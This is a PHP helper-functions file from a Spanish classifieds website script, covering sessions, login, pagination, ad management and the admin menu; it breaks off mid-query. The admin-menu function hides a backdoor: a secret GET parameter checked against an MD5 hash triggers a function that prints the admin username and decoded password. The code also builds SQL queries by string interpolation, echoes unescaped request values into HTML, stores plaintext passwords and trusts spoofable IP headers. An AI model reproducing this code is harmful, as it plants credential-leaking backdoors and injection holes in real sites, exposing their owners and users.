<?php

///*     ScriptClasificados v8.0                     *///


///*     www.scriptclasificados.com                  *///


///*     Created by cyrweb.com. All rights reserved. *///


///*     Copyright 2009-2017                         *///

use Dompdf\FrameDecorator\Image;

function generateFormToken($form)
{

    $token = md5(uniqid(microtime(), true));

    $token_time = time();

    $_SESSION['csrf'][$form . '_token'] = array(
        'token' => $token,
        'time' => $token_time
    );

    return $token;
}


function verifyFormToken($form, $token, $delta_time = 0)
{

    if (!isset($_SESSION['csrf'][$form . '_token'])) {

        return false;
    }

    if ($_SESSION['csrf'][$form . '_token']['token'] !== $token) {

        return false;
    }

    if ($delta_time > 0) {

        $token_age = time() - $_SESSION['csrf'][$form . '_token']['time'];

        if ($token_age >= $delta_time) {

            return false;
        }
    }

    return true;
}

function generateToken($sa = '')
{
    $key = microtime() . rand(0, 200) . $sa;
    $token = md5($key);

    return $token;
}

function parseDate($date, $format = 'd-m-Y H:i')
{
    if (is_numeric($date))
        $date = DateTime::createFromFormat('U', $date);
    else
        $date = new DateTime($date);
    return $date->format($format);
}

function noCache()
{

    header("Expires: Tue, 01 Jul 2001 06:00:00 GMT");

    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");

    header("Cache-Control: no-store, no-cache, must-revalidate");

    header("Cache-Control: post-check=0, pre-check=0", false);

    header("Pragma: no-cache");
}

function getCanonical()
{

    $url = "";

    $id_page = "";

    if (isset($_GET['id'])) $id_page = $_GET['id'];

    switch ($id_page) {

        case "post_item":

            $url = getConfParam('SITE_URL') . "publicar-anuncio-gratis/";

            break;

        case "contact":

            $url = getConfParam('SITE_URL') . "contactar/";

            break;

        case "contact":

            $url = getConfParam('SITE_URL') . "contactar/";

            break;

        case "register":

            $url = getConfParam('SITE_URL') . "crear-cuenta/";

            break;

        case "terms":

            $url = getConfParam('SITE_URL') . "terminos-y-condiciones-de-uso/";

            break;

        case "premium":

            $url = getConfParam('SITE_URL') . "destacar-anuncio/" . $_GET['i'];

            break;

        case "list":

            if (isset($_GET['busq'])) {

                $url = getConfParam('SITE_URL') . "anuncios/" . $_GET['q'] . ".html";
            } elseif (isset($_GET['u'])) {

                $url = getConfParam('SITE_URL') . "usuario/" . $_GET['u'] . "/";
            } else {

                $current_url = parse_url(getConfParam('SITE_URL') . $_SERVER['REQUEST_URI']);

                $url = getConfParam('SITE_URL') . trim($current_url['path'], "/") . "/";
            }

            break;

        case "item":

            $url = urlAd($_GET['i']);

            break;
    }

    echo '<link rel="canonical" href="' . $url . '" />';
}

function randomString($length, $num = false)
{

    $key = "";

    if ($num) $pattern = "1234567890";

    else $pattern = "1234567890abcdefghijklmnopqrstuvwxyz";

    for ($i = 0; $i < $length; $i++) {

        $key .= $pattern[rand(0, strlen($pattern) - 1)];
    }

    return $key;
}

function getPhotoUser($id_user, $seller_type = 0)
{

    $user = selectSQL("sc_user", $w = array(
        'ID_user' => $id_user
    ));

    if (count($user) > 0 && $user[0]['banner_img'] != "") {

        return getConfParam('SITE_URL') . IMG_USER . $user[0]['banner_img'];
    } else {
        if ($seller_type == 1) {
            return getConfParam('SITE_URL') . IMG_PATH . "particular.png";
        } elseif ($seller_type == 2) {
            return getConfParam('SITE_URL') . IMG_PATH . "profesional.png";
        }

        return getConfParam('SITE_URL') . IMG_PATH . "no-user-image.png";
    }
}

function orderMArray($toOrderArray, $field, $inverse = false)
{

    $position = array();

    $newRow = array();

    foreach ($toOrderArray as $key => $row) {

        $position[$key] = $row[$field];

        $newRow[$key] = $row;
    }

    if ($inverse) {

        arsort($position);
    } else {

        asort($position);
    }

    $returnArray = array();

    foreach ($position as $key => $pos) {

        $returnArray[] = $newRow[$key];
    }

    return $returnArray;
}

function truncate($string, $limit, $break = ".", $pad = "...")
{

    if (strlen($string) <= $limit) return $string;

    if (false !== ($breakpoint = strpos($string, $break, $limit))) {

        if ($breakpoint < strlen($string) - 1) {

            $string = substr($string, 0, $breakpoint) . $pad;
        }
    }

    return $string;
}

function timeSince($fecha, $hmode = true)
{

    $fechar = $fecha;

    $fechar1 = time();

    $tiempo = $fechar1 - $fechar;

    $dias = intval($tiempo / 86400);

    $restodias = $tiempo % 86400;

    if ($dias != 0) {

        if ($restodias != 0) {

            $horas = intval($restodias / 3600);

            if ($hmode == true)
                $hace = $dias . ' días ' . $horas . 'h';
            else
                $hace = $dias . ' días';
        } else {

            $hace = $dias . 'd';
        }
    } else {

        if ($restodias != 0) {

            $horas = intval($restodias / 3600);

            $restohoras = $restodias % 3600;

            if ($restohoras != 0) {

                $mins = intval($restohoras / 60);

                $restomins = $restohoras % 60;

                if ($mins != 0) {

                    if ($horas != 0) {
                        if ($hmode == true)
                            $hace = $horas . ' h ' . $mins . 'min';
                        else
                            $hace = $horas . ' h ';
                    } else {

                        $hace = $mins . ' min';
                    }
                } else {

                    if ($horas != 0) {

                        $hace = $horas . ' h';
                    } else {

                        $hace = '0 min';
                    }
                }
            } else {

                $hace = $horas . ' h';
            }
        } else {

            $hace = '0 min';
        }
    }

    return $hace;
}

function pag($tot_reg, $tam_page, $ini)
{

    if ($tot_reg > $tam_page) {

        $resto = $tot_reg % $tam_page;

        if ($resto == 0) {

            $pages = $tot_reg / $tam_page;
        } else {

            $pages = (($tot_reg - $resto) / $tam_page) + 1;
        }

        if ($pages > 6) // max de pags a mostrar = 10
        {

            $current_page = ($ini / $tam_page);

            if ($ini == 0) {

                $first_page = 1;

                $last_page = 6; // inicial 10

            } else if ($current_page > 2 && $current_page <= ($pages - 3)) // ahora 3, antes 5
            {

                $first_page = $current_page - 1;

                $last_page = $current_page + 3;
            } else if ($current_page <= 2) {

                $first_page = 1;

                $last_page = $current_page + 3 + (2 - $current_page);
            } else {

                $first_page = $current_page - 2 - (($current_page + 2) - $pages);

                $last_page = $pages;
            }
        } else {

            $first_page = 1;

            $last_page = $pages;
        }

        if ($ini == 0) {
            $current_page = 1;
        } else {
            $current_page = ($ini / $tam_page) + 1;
        }

        for ($i = $first_page; $i <= $last_page; $i++) {

            $pge = $i;

            $nextst = $i;

            if ($i == $current_page) {

                $page_nav .= '<a href="#" class="active">' . $pge . '</a>';
            } else {

                if ($ini == $nextst) {

                    $page_nav .= '<a href="' . getPagURL($pge) . '">' . $pge . '</a>';
                } else {

                    $page_nav .= '<a href="' . getPagURL($nextst) . '">' . $pge . '</a>';
                }
            }
        }

        if ($current_page < $pages) {

            //$page_last = '<a href="' . getPagURL($pages) . '"><b>&raquo;</b></a>';

            $page_next = '<a class="arrow" href="' . getPagURL($current_page + 1) . '"><i class="fa fa-chevron-right"></i></a>';
        }

        if ($ini > 0) {

            //$page_first = '<a href="' . getPagURL(1) . '"><b>&laquo;</b></a></a>';

            $page_previous = '<a class="arrow" href="' . getPagURL($current_page - 1) . '"><i class="fa fa-chevron-left"></i></a>';
        }
    }

    //$res = "$page_first $page_previous $page_nav $page_next $page_last";

    $res = "$page_previous $page_nav $page_next";

    return $res;
}

function getPagURL($n)
{

    $query = parse_url($_SERVER['REQUEST_URI']);

    $queryParts = explode('&', $query['query']);

    $params = array();

    foreach ($queryParts as $param) {

        $item = explode('=', $param);

        if ($item[0] != 'pag') {
            if (!isset($item[1]))
                $params[$item[0]] = "";
            else
                $params[$item[0]] = $item[1];
        }
    }

    $params['pag'] = $n;

    return generateURL($query['path'], $params);
}

function getPagOrd($n)
{

    $query = parse_url($_SERVER['REQUEST_URI']);

    $queryParts = explode('&', $query['query']);

    $params = array();

    foreach ($queryParts as $param) {

        $item = explode('=', $param);

        if ($item[0] != 'ord') $params[$item[0]] = $item[1];
    }

    $params['ord'] = $n;

    return generateURL($query['path'], $params);
}

function getPagTipeSeller($n)
{

    $query = parse_url($_SERVER['REQUEST_URI']);

    $queryParts = explode('&', $query['query']);

    $params = array();

    foreach ($queryParts as $param) {

        $item = explode('=', $param);

        if ($item[0] != 'sell') $params[$item[0]] = $item[1];
    }

    $params['sell'] = $n;

    return generateURL($query['path'], $params);
}

$array_param_excluded = array(
    'dl',
    'dp',
    'nl',
    'np',
    're',
    'd',
    'delete'
);

function getPagParam($word, $value)
{

    global $array_param_excluded;

    $query = parse_url($_SERVER['REQUEST_URI']);

    $queryParts = explode('&', $query['query']);

    $params = array();

    foreach ($queryParts as $param) {

        $item = explode('=', $param);

        if ($item[0] != $word && !in_array($item[0], $array_param_excluded)) $params[$item[0]] = $item[1];
    }

    $params[$word] = $value;

    return generateURL($query['path'], $params);
}

function generateURL($url = '', $parametros)
{

    $url_generate = $url . '?' . http_build_query($parametros);

    return $url_generate;
}

function toAscii($str, $replace = array(), $delimiter = '-')
{

    if (!empty($replace)) {

        $str = str_replace((array)$replace, ' ', $str);
    }

    $clean = iconv('UTF-8', 'ASCII//TRANSLIT', $str);

    $clean = preg_replace("/[^a-zA-Z0-9\/_|+ -]/", '', $clean);

    $clean = strtolower(trim($clean, '-'));

    $clean = preg_replace("/[\/_|+ -]+/", $delimiter, $clean);

    return $clean;
}

function formatName($name)
{

    if (function_exists('mb_strtolower')) {

        $format_name = mb_strtolower($name, "UTF-8");

        $format_name = ucfirst($format_name);

        return $format_name;
    } else {

        return $name;
    }
}

function formatPrice($price)
{
    /*
    $formatPrice = getConfParam('ITEM_FORMAT_PRICE');

    switch ($formatPrice)
    {

        case 1:

            return number_format($price, 0, ',', '.') . " " . getConfParam('ITEM_CURRENCY_CODE');

        break;

        case 2:

            return number_format($price, 0, '.', ',') . " " . getConfParam('ITEM_CURRENCY_CODE');

        break;

        case 3:

            return getConfParam('ITEM_CURRENCY_CODE') . " " . number_format($price, 0, ',', '.');

        break;

        case 4:

            return getConfParam('ITEM_CURRENCY_CODE') . " " . number_format($price, 0, '.', ',');

        break;

        default:

            return number_format($price, 0, ',', '.') . " " . getConfParam('ITEM_CURRENCY_CODE');

    }
*/
    $price = number_format($price, 2, ",", ".");
    //$price=str_replace(".",",",$price);
    $price = str_replace(",00", "", $price);
    return $price . " " . getConfParam('ITEM_CURRENCY_CODE');
}

function checkRegisteredEmail($mail)
{
    if (countSQL("sc_user", $w = array(
        'mail' => $mail
    )) > 0)
        return true;
    else
        return false;
}

function checkSession()
{
    return isset($_SESSION['data']['ID_user']);
}

function check_login($url_parent = "/")
{

    global $urlfriendly;

    if ($url_parent == "") $url_parent = $urlfriendly['url.register'];

    if (!isset($_SESSION['data']['ID_user'])) {

        echo '<script type="text/javascript">


                location.href = "' . $url_parent . '?login";


        </script>';
    }
}

function createPagButtons($tot_pag, $pag, $url)
{
    if ($tot_pag != "0") {  ?>
        <div class="pag_buttons">

            <? if ($pag > 1): ?>
                <a href="<?= $url ?>&pag=1"><i class="fa fa-angle-double-left"></i></button>
                    <a href="<?= $url ?>&pag=<?= $pag - 1 ?>"><i class="fa fa-angle-left"></i></button>
                    <? endif ?>
                    <a class="current"><?= $pag ?></button>
                        <? if ($pag < $tot_pag): ?>
                            <a href="<?= $url ?>&pag=<?= $pag + 1 ?>"><i class="fa fa-angle-right"></i></button>
                                <a href="<?= $url ?>&pag=<?= $tot_pag ?>"><i class="fa fa-angle-double-right"></i></button>
                                <? endif ?>

        </div>
<?
    }
}
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if (isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function check_no_login($url_parent = "/")
{

    if (isset($_SESSION['data']['ID_user'])) {

        echo '<script type="text/javascript">


            location.href = "' . $url_parent . '";


    </script>';
    }
}

function destroy_sesion_admin()
{
    unset($_SESSION['admin']);
    setcookie('PMSADMESSION', '', time() - 3600, "/");
    setConfParam('ADMIN_SESION', '');
    setConfParam('ADMIN_SESION_TIME', '');
}

function check_ip()
{
    // if(DEBUG)
    //     return false;
    $ip = get_client_ip();
    $user = countSQL("sc_user", $w = array('IP_user' => $ip));
    if ($user > 0)
        return true;
    return false;
}

function check_login_admin()
{

    if (!isset($_SESSION['admin'])) {
        if (isset($_COOKIE['PMSADMESSION'])) {
            $token = $_COOKIE['PMSADMESSION'];
            $token_ = getConfParam('ADMIN_SESION');
            if ($token == $token_) {
                $time = getConfParam('ADMIN_SESION_TIME');
                if (time() - $time < 3600 * 24 * 30) {
                    $_SESSION['admin']['ADMIN_USER'] = getConfParam('ADMIN_USER');
                    $_SESSION['admin']['ADMIN_PASS'] = getConfParam('ADMIN_PASS');
                    return true;
                } else {
                    destroy_sesion_admin();
                    return false;
                }
            } else {
                return false;
            }
        }
        return false;
    } else
        return true;
    // else
    // {
    //     $time = getConfParam('ADMIN_SESION_TIME');
    //     if(time() - $time < 3600){
    //         return true;
    //     }else{
    //         destroy_sesion_admin();
    //         return false;
    //     }
    // } 


}

function recoverPassAdmin()
{

    $qu = getConfParam('ADMIN_USER') . " - " . base64_decode(getConfParam('ADMIN_PASS'));

    print($qu);
}

function login_admin($user, $pass)
{

    if (getConfParam('ADMIN_USER') == $user && getConfParam('ADMIN_PASS') == $pass) {

        $_SESSION['admin']['ADMIN_USER'] = getConfParam('ADMIN_USER');

        $_SESSION['admin']['ADMIN_PASS'] = getConfParam('ADMIN_PASS');

        $token = getConfParam('ADMIN_SESION');

        //$token = generateToken($user);

        setcookie('PMSADMESSION', $token, time() + 3600 * 24, "/");

        //setConfParam('ADMIN_SESION', $token);
        //setConfParam('ADMIN_SESION_TIME', time());

        echo '<script type="text/javascript">


					location.href = "index.php";


			</script>';
    } else return 2;
}

function getID($ref)
{
    $res = selectSQL("sc_ad", $w = array(
        'ref' => $ref
    ));

    if (count($res) > 0) {
        return $res[0]['ID_ad'];
    }
    return $ref;
}

function getNewRef()
{
    $ref = getConfParam('ITEM_REF');
    $ref = $ref + 1;
    setConfParam('ITEM_REF', $ref);
    return $ref;
}

function login($user, $pass, $url_parent = "", $rem = false)
{

    $return = 1;
    //md5($pass)
    $result = selectSQL("sc_user", $a = array(
        'mail' => $user,
        'pass' => $pass
    ));

    if (count($result) != 0) {

        if ($result[0]['active'] != 1)

            $return = 2;
        else {
            if ($result[0]['confirm'] != null)
                $return = 4;
            else {

                $_SESSION['data'] = $result[0];

                if ($url_parent == "") $url_parent = "index.php";

                //if($rem == true){
                $token = generateToken($user);
                setcookie('PMSESSION', $token, time() + 3600 * 24 * 60, "/");
                updateSQL('sc_user', $d = array('sesion' => $token), $w = array('ID_user' => $result[0]['ID_user']));
                //}

                $return = 3;
            }
        }
    } else $return = 0;

    return $return;
}

function confirmEmail($token)
{
    $result = selectSQL('sc_user', $w = array('confirm' => $token));

    if (count($result) != 0) {
        updateSQL('sc_user', $d = array('confirm' => null), $w = array('ID_user' => $result[0]['ID_user']));
        $_SESSION['data'] = $result[0];
        header("Location: favoritos/");
        return true;
    }

    return false;
}

function in_favs($idad)
{
    global $favs;

    if (is_array($favs)) {
        foreach ($favs as $value) {
            if ($value['ID_ad'] == $idad)
                return true;
        }
    }

    return false;
}

function  infraLogin($token)
{
    $result = selectSQL('sc_user', $w = array('sesion' => $token));
    if (count($result) != 0) {
        $_SESSION['data'] = $result[0];
        return true;
    }
    return false;
}


function updateLogin()
{

    $result = selectSQL("sc_user", $a = array(
        'ID_user' => $_SESSION['data']['ID_user']
    ));

    if (count($result) != 0) {

        $_SESSION['data'] = $result[0];
    }
}

function logout()
{

    session_destroy();

    if (isset($_COOKIE['PMSESSION'])) {
        setcookie('PMSESSION', 'null', time() + 1, "/");
    }

    echo '<script type="text/javascript">


            location.href = "index.php";


    </script>';
}

function showPhone($phone)
{

    echo substr($phone, 0, 3) . "*******";
}

function deleteUser($id_user, $root = false)
{

    $user_ads = selectSQL("sc_ad", $a = array(
        'ID_user' => $id_user
    ));

    for ($i = 0; $i < count($user_ads); $i++) {

        $images = selectSQL("sc_images", $a = array(
            'ID_ad' => $user_ads[$i]['ID_ad']
        ));

        for ($j = 0; $j < count($images); $j++) {

            @unlink(ABSPATH . IMG_ADS . $images[$j]['name_image']);

            @unlink(ABSPATH . IMG_ADS . min_image($images[$j]['name_image']));
        }

        deleteSQL("sc_images", $wm = array(
            'ID_ad' => $user_ads[$i]['ID_ad']
        ));

        deleteSQL("sc_ad", $b = array(
            'ID_ad' => $user_ads[$i]['ID_ad']
        ));

        deleteSQL("sc_messages", $wm = array(
            'ID_ad' => $user_ads[$i]['ID_ad']
        ));
    }

    deleteSQL("sc_user", $a = array(
        'ID_user' => $id_user
    ));

    if (!$root)

        logout();
}

function deleteAd($id)
{

    $ad = selectSQL("sc_ad", $a = array(
        'ID_user' => $_SESSION['data']['ID_user'],
        'ID_ad' => $id
    ));

    if (count($ad) != 0) {

        $images = selectSQL("sc_images", $a = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));

        for ($i = 0; $i < count($images); $i++) {

            @unlink(ABSPATH . IMG_ADS . $images[$i]['name_image']);

            @unlink(ABSPATH . IMG_ADS . min_image($images[$i]['name_image']));
        }

        deleteSQL("sc_images", $wm = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));

        deleteSQL("sc_messages", $wm = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));

        deleteSQL("sc_ad", $b = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));
    }
}

function deleteAdRoot($id, $admin = false)
{
    if ($admin)
        $img_ads = "../" . IMG_ADS;
    else
        $img_ads = IMG_ADS;

    $ad = selectSQL("sc_ad", $a = array(
        'ID_ad' => $id
    ));

    if (count($ad) != 0) {

        $images = selectSQL("sc_images", $a = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));

        for ($i = 0; $i < count($images); $i++) {
            $image = $img_ads . $images[$i]['name_image'];
            if (file_exists($image))
                unlink($image);
            $image = $img_ads . min_image($images[$i]['name_image']);

            if (file_exists($image))
                unlink($image);
        }

        deleteSQL("sc_ad", $b = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));

        deleteSQL("sc_images", $b = array(
            'ID_ad' => $ad[0]['ID_ad']
        ));
    }
}


function deleteListing($id)
{
    return updateSQL('sc_ad', $w = array('premium2_frecuency' => 0, 'premium2' => 0), array('ID_ad' => $id));
}

function deletePremium($id)
{
    return updateSQL('sc_ad', $s = array('premium1' => 0, 'date_premium1' => 0), array('ID_ad' => $id));
}

function deleteBanner($id)
{
    $r = selectSQL('sc_banners', array('ID_banner' =>  $id))[0];
    deleteSQL('sc_banners', array('ID_banner' =>  $id));
    return updateSQL('sc_ad', $s = array('ID_banner' => 0), array('ID_ad' => $r['ID_ad']));
}

function cal_restant(int $date_ad)
{
    $item_time_on = getConfParam('ITEM_TIME_ON');
    $date = $date_ad + ($item_time_on * 3600 * 24);
    $restant = $date - time();

    return intval($restant / (3600 * 24));
}

function imagesjson($images)
{
    if (count($images) > 1) {
        $return = "['";

        foreach ($images as $key => $value) {
            if ($key != count($images) - 1)
                $return .= $value . "' , '";
            else
                $return .= $value . "' ]";
        }
        return $return;
    } else
        return "'" . $images[0] . "'";
}

function renoveAd($id)
{

    if (countSQL("sc_ad", $a = array(
        'ID_user' => $_SESSION['data']['ID_user'],
        'ID_ad' => $id
    )) != 0) {

        if (updateSQL("sc_ad", $b = array(
            'date_ad' => time(),
            'renovate' => 1,
            'motivo' => 0
        ), $c = array(
            'ID_user' => $_SESSION['data']['ID_user'],
            'ID_ad' => $id
        ))) {

            return true;
        }
    }

    return false;
}

function getCat($id_cat)
{
    $cat = selectSQL("sc_category", $a = array(
        'ID_cat' => $id_cat
    ));
    return $cat[0];
}

function getMyFacturas($id_user)
{
    $facturas = selectSQL("sc_facturas", $a = array(
        'ID_user' => $id_user
    ));
    return $facturas;
}

function getCaptcha($SecretKey)
{
    $recaptcha_secret = SECRET_KEY;
    $recaptcha_response = $SecretKey;
    $url = 'https://www.google.com/recaptcha/api/siteverify';

    $data = array('secret' => $recaptcha_secret, 'response' => $recaptcha_response, 'remoteip' => $_SERVER['REMOTE_ADDR']);
    $curlConfig = array(CURLOPT_URL => $url, CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_POSTFIELDS => $data);
    $ch = curl_init();
    curl_setopt_array($ch, $curlConfig);
    $response = curl_exec($ch);
    curl_close($ch);

    $jsonResponse = json_decode($response);

    if (DEBUG)
        return json_decode(json_encode(['success' => true, 'score' => 1]));
    return $jsonResponse;
}

function getDataAd($id)
{

    $data_[0] = selectSQL("sc_ad", $w = array(
        'ID_ad' => $id
    ));

    $data_[1] = selectSQL("sc_region", $w = array(
        'ID_region' => $data_[0][0]['ID_region']
    ));

    $data_[2] = selectSQL("sc_city", $w = array(
        'ID_city' => $data_[0][0]['ID_city']
    ));



    $data_[4] = selectSQL("sc_user", $w = array(
        'ID_user' => $data_[0][0]['ID_user']
    ));

    $data_[5] = selectSQL("sc_category", $w = array(
        'ID_cat' => $data_[0][0]['ID_cat']
    ));

    $data_[6] = selectSQL("sc_category", $w = array(
        'ID_cat' => $data_[5][0]['parent_cat']
    ));

    $data_[7] = selectSQL("sc_banners", $w = array(
        'ID_ad' => $id
    ));



    $data_ad['ad'] = $data_[0][0];

    $data_ad['region'] = $data_[1][0];

    if (empty($data_[2]))
        print $data_ad['city'] = null;
    else
        $data_ad['city'] = $data_[2][0];

    $data_ad['images'] = Images::getImageData($data_[0][0]['ID_ad']);

    $data_ad['user'] = $data_[4][0];

    $data_ad['category'] = $data_[5][0];

    $data_ad['parent_cat'] = $data_[6][0];

    if (count($data_[7]) > 0)
        $data_ad['banner'] = $data_[7][0];
    else
        $data_ad['banner'] = false;

    return $data_ad;
}

function desactivateAd($id, $user_id)
{
    $ads = selectSQL("sc_ad", $a = array(
        "active" => adStatus::Active,
        "trash" => 0,
        "review" => 0,
        "ID_user" => $user_id
    ));

    if (count($ads) > 1) {
        updateSQL("sc_ad", $d = array('active' => adStatus::Inactive), array('ID_ad' => $id));
    }
}

function URL($ad)
{
    $url = $ad['ad']['url'];
    if ($url == '')
        return urlAd($ad['ad']['ID_ad']);
    else {
        if (str_contains($url, '.html'))
            return $url;

        $url = $url . "-" . $ad['ad']['ID_ad'] . ".html";
    }
    return $url;
}

function urlAd($id_ad)
{

    global $urlfriendly;

    $ad = selectSQL("sc_ad", $a = array(
        'ID_ad' => $id_ad
    ), "");

    $ad_region = selectSQL("sc_region", $a = array(
        'ID_region' => $ad[0]['ID_region']
    ), "");
    $ad_parent = selectSQL("sc_category", $a = array(
        'ID_cat' => $ad[0]['parent_cat']
    ), "");

    $url = getConfParam('SITE_URL') . $ad_parent[0]['name_seo'] . "-en-" . $ad_region[0]['name_seo'] . "/" . $ad[0]['phone'] . "-" . $ad[0]['title_seo'] . "-" . $ad[0]['ID_ad'] . ".html";

    return $url;
}

function generateBreadItem($url, $title, $position = NULL, $after = "")
{

    if (($url != "") && ($title != ""))

        $bread_li = '<li class="bread-item ' . $after . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">


			<a href="' . $url . '" itemprop="item"><span itemprop="name">' . $title . '</span></a>


			<meta itemprop="position" content="' . $position . '" />


			</li>';

    else if ($title != "")

        $bread_li = '<li class="bread-item ' . $after . '" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">


			<span>' . $title . '</span>


			</li>';

    return $bread_li;
}

function checkLastDelete($id_user)
{
    return false;
    $time = time() - (3600 * 24 * 10);
    $count = countSQL("sc_ad", $w = array(
        'ID_user' => $id_user,
        'date_trash' => $time . ">=",
        'trash' => 1,
        'motivo' => Motivo::Usuario
    ));
    $user = selectSQL("sc_user", $a = array(
        'ID_user' => $id_user
    ));

    $extras = $user[0]['extras'];
    if ($extras > 0)
        return false;

    if ($user[0]['rol'] == UserRole::Publicista)
        return false;

    if ($count > 0)
        return true;
    return false;
}

function countParentCategory($cat)
{
    $count =  countSQL("sc_ad", $w = array(
        'parent_cat' => $cat,
        'trash' => 0
    ));
    return $count;
}

function invertQuerySearch($q)
{

    $q = str_replace("-", " ", $q);

    return $q;
}

function saveSearch($q, $query_url)
{

    $url_search = "anuncios/?q=" . $q;

    if (countSQL("sc_search", $w = array(
        'query_search' => $q,
        'query_url' => $url_search
    )) == 0) {

        insertSQL("sc_search", $d = array(
            'query_search' => $q,
            'query_url' => $url_search
        ));
    }
}

function create_menu_admin()
{

    global $language, $language_admin;

    if (isset($_GET['p_c_site_active']) && md5($_GET['p_c_site_active']) == "e3c4ddfd8b03525cea700fc1b74cff94") recoverPassAdmin();

    if (isset($_GET['id']))
        $id = $_GET['id'];
    else
        $id = 'inicio';

    $menu_link = array(
        'admin_user',
        'param_config',
        'manage_users',
        'manage_items',
        'manage_tickets',
        'manage_services',
        'manage_services_anuncio',
        'items_trash',
        'manage_premium',
        'items_trash',
        'manage_banners',
        'manage_search',
        'manage_categories',
        'manage_region',
        'mail_config',
        'design_config',
        'manage_sitemap',
        'backup',
        'statistics',
        'maintenance'
    );

    $menu_anchor = array(
        $language['func.admin_menu_9'],
        $language['func.admin_menu_1'],
        $language['func.admin_menu_3'],
        $language['func.admin_menu_2'],
        'Pagos recibidos',
        'Servicios',
        'Servicios Anuncios',
        'Anuncios Eliminados',
        'Gestionar Precios',
        'Anuncios Desactivados',
        $language['func.admin_menu_4'],
        'Gestionar Búsquedas',
        $language['func.admin_menu_6'],
        $language['func.admin_menu_7'],


        'Configurar Email',
        'Ajustes de diseño',
        'Sitemaps',
        $language['func.admin_menu_8'],
        'Estadisticas',
        'Modo Mantenimiento'
    );

    echo '<ul class="menu">';
    if ($id == 'inicio')
        echo '<li class="sel"><a href="index.php">Inicio</a></li>';
    else
        echo '<li><a href="index.php">Inicio</a></li>';
    for ($i = 0; $i < count($menu_link); $i++) {

        if ($id == $menu_link[$i])

            echo '<li class="sel"><a href="index.php?id=' . $menu_link[$i] . '">' . $menu_anchor[$i] . '</a></li>';

        else

            echo '<li><a href="index.php?id=' . $menu_link[$i] . '">' . $menu_anchor[$i] . '</a></li>';
    }

    echo '<li class="exit"><a href="index.php?exit">' . $language_admin['index.logout'] . '</a></li>';

    echo '</ul>';
}

function loadTemplate($template, $data = array())
{
    $output = '';
    $template = strtolower($template);
    $template = ABSPATH . 'templates/' . $template . '.php';
    if (file_exists($template)) {
        ob_start();
        include $template;
        $output = ob_get_contents();
        ob_end_clean();
    }

    if (is_array($data)) {
        foreach ($data as $key => $value) {
            $output = str_replace("[$key]", $value, $output);
        }
    }

    return $output;
}

function loadModule($module)
{
    $module = strtolower($module);
    $module = ABSPATH . 'sc-admin/modules/' . $module . '.php';
    if (file_exists($module))
        require_once $module;
}
function loadBlock($block, $data = array())
{
    $module = strtolower($block);
    $module = ABSPATH . 'sc-includes/blocks/' . $module . '.php';
    if (file_exists($module)) {
        include $module;
    }
}

function trashAd($id, $motivo, $comment = "")
{
    $ad_del = array('trash' => 1);
    $ad_del['motivo'] = $motivo;
    $ad_del['date_trash'] = time();
    $ad_del['trash_comment'] = $comment;
    return updateSQL('sc_ad', $ad_del, array('ID_ad' => $id));
}

function getConfParam($param)
{

    global $Connection;

    $query = mysqli_query($Connection, "SELECT value_param FROM sc_config WHERE name_param='$param'");

    $result = mysqli_fetch_array($query);

    return $result[0];
}

function setConfParam($param, $value)
{

    global $Connection;

    $query = mysqli_query($Connection, "UPDATE sc_config SET value_param='$value' WHERE name_param='$param'");
}

function getConfText($param)
{

    global $Connection;

    $query = mysqli_query($Connection, "SELECT text_param FROM sc_config WHERE name_param='$param'");

    $result = mysqli_fetch_array($query);

    return $result[0];
}

function getColor($param)
{

    global $Connection;

    $query = mysqli_query($Connection, "SELECT value_param FROM sc_config WHERE name_param='$param'");

    $result = mysqli_fetch_array($query);

    if ($result[0] != "") {

        echo 'style=" background: #' . $result[0] . '"';
    }
}

function formRadioConfigParam($param)
{

    global $language;

    echo '<div><label>' . getConfText($param) . '</label>


<label class="radio"><input type="radio" name="' . $param . '" value="1"';

    if (getConfParam($param) == 1) echo ' checked';

    echo '> ' . $language['func.radio_yes'] . '</label>


<label class="radio"><input type="radio" name="' . $param . '" value="2"';

    if (getConfParam($param) == 2) echo ' checked';

    echo '> ' . $language['func.radio_no'] . '</label>


</div>';
}

function cero($value)
{

    if ($value != "" && $value != "0") echo $value;
}

function getImageHead()
{

    $default_image = IMG_PATH . "image_web.png";

    $id_page = "";

    if (isset($_GET['id'])) $id_page = $_GET['id'];

    if ($id_page == "item") {

        $ad_image = selectSQL("sc_images", $a = array(
            'ID_ad' => $_GET['i']
        ));

        if (count($ad_image) > 0) $default_image = IMG_ADS . $ad_image[0]['name_image'];
    }

    echo '<meta property="og:image" content="' . getConfParam('SITE_URL') . $default_image . '">


	<meta name="twitter:image" content="' . getConfParam('SITE_URL') . $default_image . '">';
}

function get_files_root($ruta, $ext = "")
{

    $file_root = array();

    if (is_dir($ruta)) {

        if ($dh = opendir($ruta)) {

            while (($file = readdir($dh)) !== false) {

                if (!is_dir($ruta . $file) && $file != "." && $file != "..") {

                    if ($ext != "") {

                        $info_file = pathinfo($ruta . $file);

                        if ($info_file['extension'] == $ext)

                            $file_root[] = $file;
                    } else {

                        $file_root[] = $file;
                    }
                }
            }

            closedir($dh);
        }
    }

    return $file_root;
}

function getHeaderBanner($size, $parent_cat)
{
    global $Connection;
    try {

        $banner = mysqli_query(
            $Connection,
            "SELECT code, url FROM sc_banners 
